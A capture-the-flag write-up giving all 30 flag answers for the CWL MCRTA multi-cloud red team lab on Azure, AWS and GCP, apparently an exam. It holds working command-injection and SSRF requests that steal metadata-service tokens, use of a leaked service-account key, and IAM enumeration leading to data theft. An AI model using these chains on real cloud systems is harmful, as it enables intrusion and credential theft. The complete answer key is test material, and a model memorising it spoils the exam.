# CWL MCRTA Multi-Cloud Red Team Lab — Technical Write-up

Scenarios: `atomic-nuclear.site` (Azure) and `cwl-metatech` (AWS / GCP)
All 30 flags documented with full HTTP requests, API calls, and responses.

## Attack Pattern (universal across all 3 providers)

```
OSINT → Compromise low-priv identity → Enumerate IAM at every scope → Escalate → Data
```

1. OSINT discover infrastructure (GitHub leaks, DNS, S3 bucket enum)
2. Compromise lowest-privilege identity (leaked SA keys, VM metadata via SSRF/command injection)
3. Enumerate IAM at every scope (subscription/resource-group/resource for Azure, project/role/instance for GCP, account/policy/group for AWS)
4. Escalate via misconfigurations (custom roles, over-broad perms, cross-account trusts)
5. Access sensitive data (storage buckets, VM metadata, application secrets)

---

## Azure Cloud Red Teaming — Flags 1–10

### Target: `internal.atomic-nuclear.site` / `internal.meta-tech.cloud`
### Vulnerable App: URL Score Calculator (`process.php` — SSRF + Command Injection)

#### Flag 1 — Subdomain

**Question:** Subdomain hosting the app on Azure VM

```bash
# DNS brute-force
dnsrecon -d atomic-nuclear.site -t brt
# Results: app, internal, mail subdomains found
```

**Answer:** `internal`

---

#### Flag 2 — JWT "iss" Claim

**Question:** "iss" claim in JWT token of VM metadata

**Raw HTTP Request:**
```http
POST /process.php HTTP/1.1
Host: internal.atomic-nuclear.site
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=----geckoformboundary2bc187f68170df07973731d85d783e5

------geckoformboundary2bc187f68170df07973731d85d783e5
Content-Disposition: form-data; name="url"

https://wzzsyum2fvfhncel86t66tnppgv7j07p.oastify.com
------geckoformboundary2bc187f68170df07973731d85d783e5
Content-Disposition: form-data; name="date"

2025-07-05
------geckoformboundary2bc187f68170df07973731d85d783e5
Content-Disposition: form-data; name="ip"

wzzsyum2fvfhncel86t66tnppgv7j07p.oastify.com
------geckoformboundary2bc187f68170df07973731d85d783e5
Content-Disposition: form-data; name="organization"

curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
------geckoformboundary2bc187f68170df07973731d85d783e5--
```

**Raw HTTP Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

{"access_token":"eyJ0eXAiOiJKV1QiLCJub25jZSI6InlFVXdt...","token_type":"Bearer","resource":"https://management.azure.com"}
```

Decode JWT payload (middle segment):
```bash
echo "eyJ0eXAi..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# "iss": "https://sts.windows.net/143198c4-77be-42f7-b18e-95c5b693e6b9/"
```

**Answer:** `https://sts.windows.net/143198c4-77be-42f7-b18e-95c5b693e6b9/`

---

#### Flag 3 — Tenant ID

Extracted from JWT `iss` claim: UUID between `/sts.windows.net/` and `/`.

**Answer:** `143198c4-77be-42f7-b18e-95c5b693e6b9`

---

#### Flag 4 — Subscription ID

**Raw HTTP Request:**
```http
POST /process.php HTTP/1.1
Host: internal.atomic-nuclear.site
Content-Type: multipart/form-data; boundary=----geckoformboundary2bc187f68170df07973731d85d783e5

------boundary
Content-Disposition: form-data; name="organization"

curl -s -X GET -H "Authorization: Bearer eyJ0eXAi..." "https://management.azure.com/subscriptions?api-version=2020-01-01"
------boundary--
```

**Raw HTTP Response:**
```json
{"value":[{"id":"/subscriptions/b78b4f4a-d993-49d3-9f98-c8752ce9c711",
  "subscriptionId":"b78b4f4a-d993-49d3-9f98-c8752ce9c711",
  "tenantId":"143198c4-77be-42f7-b18e-95c5b693e6b9",
  "displayName":"Demo-Lab-Testing","state":"Enabled"}]}
```

**Answer:** `b78b4f4a-d993-49d3-9f98-c8752ce9c711`

---

#### Flag 5 — Subscription-Level Role

**Method:** Role assignments API filtered by VM managed identity principalId.

**Raw HTTP Request:**
```http
POST /process.php
organization = curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId eq '{vm_principal_id}'"
```

**Answer:** `Reader`

---

#### Flag 6 — Custom Role Assignment Scope

**Raw HTTP Request:**
```http
POST /process.php
organization = curl -s -X GET -H "Authorization: Bearer eyJ0eXAi..." \
  "https://management.azure.com/subscriptions/{sub}/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm/providers/Microsoft.Authorization/roleAssignments?api-version=2021-04-01-preview"
```

**Answer:** `/subscriptions/b78b4f4a-d993-49d3-9f98-c8752ce9c711/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm`

---

#### Flag 7 — Custom Role Actions

**Raw HTTP Request:**
```http
POST /process.php
organization = curl -s -X GET -H "Authorization: Bearer eyJ0eXAi..." \
  "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01&$filter=roleName eq 'custom-role-definition'"
```

**Raw HTTP Response:**
```json
{"properties":{"roleName":"custom-role-definition",
  "permissions":[{"actions":["Microsoft.Resources/subscriptions/resourceGroups/read"]}]}}
```

**Answer:** `Microsoft.Resources/subscriptions/resourceGroups/read`

---

#### Flag 8 — Email of User in "IT Ops" Group

**Raw HTTP Requests:**
```bash
# 1. Get Graph token via IMDS
POST /process.php
organization = curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# 2. Enumerate groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups"
# Find IT Ops group ID: 796afff8-eb75-4b59-b466-f45267140514

# 3. Get group members
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/796afff8-eb75-4b59-b466-f45267140514/members"
```

**Raw Response:**
```json
{"@odata.type":"#microsoft.graph.user",
 "displayName":"IT","userPrincipalName":"it@meta-tech.cloud"}
```

**Answer:** `it@meta-tech.cloud`

---

#### Flag 9 — Owner of "prod-app" Application

**Raw HTTP Requests:**
```bash
# 1. List applications
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications"
# prod-app ID: 8c39f5cb-a738-42e2-8ba0-5c61fa8a032a

# 2. Get owners
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/8c39f5cb-a738-42e2-8ba0-5c61fa8a032a/owners"
```

**Raw Response:**
```json
{"@odata.type":"#microsoft.graph.user",
 "displayName":"IT","userPrincipalName":"it@meta-tech.cloud"}
```

**Answer:** `IT`

---

#### Flag 10 — Microsoft Graph API Permission on "dev-app"

**Raw HTTP Requests:**
```bash
# 1. Get dev-app details
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/0c245104-79d9-418c-8881-610d5ff1ff76"
```

**Extract from response:**
```json
"requiredResourceAccess": [{
  "resourceAppId": "00000003-0000-0000-c000-000000000000",
  "resourceAccess": [
    {"id": "df021288-bdef-4463-88db-98f22de89214", "type": "Role"},
    {"id": "b4e74841-8e56-480b-be8b-910348b18b4c", "type": "Scope"}
  ]
}]
```

```bash
# 2. Resolve GUIDs via Microsoft Graph service principal
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'&\$select=appRoles,oauth2PermissionScopes"
```

**Match results:**
- `df021288-bdef-4463-88db-98f22de89214` → `User.Read.All` (Application role)
- `b4e74841-8e56-480b-be8b-910348b18b4c` → `User.ReadWrite` (Delegated scope)

**Answer:** `User.Read.All`

---

## AWS Cloud Red Teaming — Flags 1–10

### Target: `cwl-metatech` organization

### Flag 1 — S3 Bucket URL

```bash
python cloud_enum.py -k cwl-metatech
```
**Result:**
```
OPEN S3 BUCKET: http://cwl-metatech.s3.amazonaws.com/
  -> dev-server-ip.txt
  -> prod-data.txt
```

**Answer:** `http://cwl-metatech.s3.amazonaws.com/`

---

### Flag 2 — SSRF Parameter

**Question:** Parameter on dev-server EC2 vulnerable to SSRF

Navigate to dev-server IP, inspect `update.html` form fields (`url`, `date`, `ip`, `organization`). The `ip` field in `calculate_score.php` triggers server-side fetch.

**Answer:** `ip`

---

### Flag 3 — EC2 Instance Role

```bash
POST /process.php
organization = curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Response:** `ec2-role`

**Answer:** `ec2-role`

---

### Flag 4 — User in "interns" Group

```bash
POST /process.php
organization = aws iam get-group --group-name interns
```

**Answer:** `int001`

---

### Flag 5 — Group for "emp003"

```bash
POST /process.php
organization = aws iam list-groups-for-user --user-name emp003
```

**Answer:** `employees`

---

### Flag 6 — Cross-Account Role Account ID

```bash
POST /process.php
organization = aws iam get-role --role-name crossaccount-role
```

**Answer:** `999909936336`

---

### Flag 7 — Role Assumed by "devops-role"

```bash
POST /process.php
organization = aws iam list-roles
# Filter trust relationships containing devops-role → dev-role
```

**Answer:** `dev-role`

---

### Flag 8 — Inline Policy on "emp001"

```bash
POST /process.php
organization = aws iam list-user-policies --user-name emp001
```

**Answer:** `s3-administrator-Policy`

---

### Flag 9 — Policy on "employees" Group

```bash
POST /process.php
organization = aws iam list-attached-group-policies --group-name employees
```

**Answer:** `arn:aws:iam::aws:policy/AmazonDevOpsGuruFullAccess`

---

### Flag 10 — Credit Card in S3

```bash
aws s3 cp s3://cwl-metatech/prod-data.txt .
cat prod-data.txt
# Bob / Cabal1 / 6271701225979642 / 03/2026
```

**Answer:** `6271701225979642`

---

## GCP Cloud Red Teaming — Flags 1–10

### Entry Point: Leaked Service Account Key on GitHub

**Repository:** `https://github.com/cwl-metatech/production-data`
**File:** `pipeline.yml`
**Technique:** Base64-encoded GCP SA key in `ENCRYPTED_GCP_KEY` environment variable

```bash
curl -s "https://raw.githubusercontent.com/cwl-metatech/production-data/main/pipeline.yml"
# Extract base64 value from ENCRYPTED_GCP_KEY variable

echo "<base64_key>" | base64 -d > /tmp/gcp-sa-key.json

gcloud auth activate-service-account dev-service-account@mcrta-exam.iam.gserviceaccount.com \
  --key-file=/tmp/gcp-sa-key.json --project=mcrta-exam
```

**Service Account:** `dev-service-account@mcrta-exam.iam.gserviceaccount.com`
**Project:** `mcrta-exam`

---

### Flags 1–4 (Pre-completed)

| # | Answer |
|---|--------|
| 1 | `https://github.com/cwl-metatech/production-data` |
| 2 | `mcrta-exam` |
| 3 | `stag-instance` |
| 4 | `vm-service-account@mcrta-exam.iam.gserviceaccount.com` |

---

### Flag 5 — vm-service-account Project-Level Role

```bash
GCP_TOKEN=$(gcloud auth print-access-token)

# getIamPolicy uses POST, not GET
curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/mcrta-exam:getIamPolicy" \
  -d '{}' | python3 -c "
import json, sys
for b in json.loads(sys.stdin.read()).get('bindings', []):
    for m in b.get('members', []):
        if 'vm-service-account' in m:
            print(b['role'])
"
```

**Answer:** `roles/reader`

> ⚠️ Common pitfall: `getIamPolicy` returns HTTP 404 if you use GET instead of POST.

---

### Flag 6 — SA with "VMRead*" Custom Role

Same IAM policy query, filter for `VMRead`:

```bash
curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/mcrta-exam:getIamPolicy" \
  -d '{}' | python3 -c "
import json, sys
for b in json.loads(sys.stdin.read()).get('bindings', []):
    if 'VMRead' in b['role']:
        print(b['members'])
"
```

```json
{"role": "projects/mcrta-exam/roles/VMReadgek",
 "members": ["serviceAccount:dev-service-account@mcrta-exam.iam.gserviceaccount.com"]}
```

**Answer:** `dev-service-account@mcrta-exam.iam.gserviceaccount.com`

---

### Flag 7 — VMRead* Custom Role Permission

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://iam.googleapis.com/v1/projects/mcrta-exam/roles/VMReadgek"
```

**Response:**
```json
{"name": "projects/mcrta-exam/roles/VMReadgek",
 "title": "VM Reader",
 "includedPermissions": ["compute.instances.list"]}
```

**Answer:** `compute.instances.list`

---

### Flag 8 — dev SA Permission on Compute Instance

```bash
gcloud compute instances get-iam-policy stag-instance \
  --zone=us-central1-b --project=mcrta-exam
```

**Response:**
```yaml
bindings:
- members:
  - serviceAccount:dev-service-account@mcrta-exam.iam.gserviceaccount.com
  role: roles/reader
```

**Answer:** `roles/reader`

---

### Flag 9 — Cloud Storage Bucket Name

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=mcrta-exam"
```

**Response:**
```json
{"items":[{"name":"stag-storage-metatech-prod11"}]}
```

**Answer:** `stag-storage-metatech-prod11`

---

### Flag 10 — License Key

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/stag-storage-metatech-prod11/o/license-key.txt?alt=media"
```

**Response:** `V13JG-NPH5M-S97JM-9MPGT-3S66T`

**Answer:** `V13JG-NPH5M-S97JM-9MPGT-3S66T`

---
